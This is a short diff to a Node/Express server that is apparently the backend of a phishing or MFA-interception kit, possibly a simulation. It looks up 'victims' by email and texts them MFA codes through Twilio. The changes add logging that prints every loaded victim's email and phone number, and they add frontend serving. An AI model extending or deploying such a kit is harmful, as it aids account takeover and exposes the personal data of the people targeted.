@@ -240,6 +240,16 @@ app.post('/api/send-code', async (req, res) => {
   const phoneNumber = victim?.phone || '';
 
   console.log(`📱 MFA code for ${email}: ${code} (method: ${method}, phone: ${phoneNumber})`);
+  if (!victim) {
+    console.log(`⚠️  No victim found for email "${email}" — have ${victimData.length} victims loaded:`);
+    victimData.forEach(v => console.log(`   "${v.email}" | "${v.phone}"`));
+  }
+  if (!phoneNumber) {
+    console.log(`❌ No phone number — skipping Twilio send`);
+  }
+  if (!twilioClient) {
+    console.log(`❌ Twilio client not initialized`);
+  }
 
   if (twilioClient && phoneNumber) {
     try {
@@ -400,6 +410,19 @@ app.post('/api/reset', (req, res) => {
   Object.keys(activeCodes).forEach(k => delete activeCodes[k]);
   res.json({ success: true });
 });
+
+// ─── Serve Frontend (production) ───
+const clientBuildPath = path.join(__dirname, '..', 'dist', 'client');
+if (fs.existsSync(clientBuildPath)) {
+  app.use(express.static(clientBuildPath));
+  // All non-API routes serve the React app (SPA fallback)
+  app.get('*', (req, res) => {
+    if (!req.path.startsWith('/api')) {
+      res.sendFile(path.join(clientBuildPath, 'index.html'));
+    }
+  });
+  console.log('📦 Serving frontend from', clientBuildPath);
+}
 
 // ─── Start ───
 async function start() {
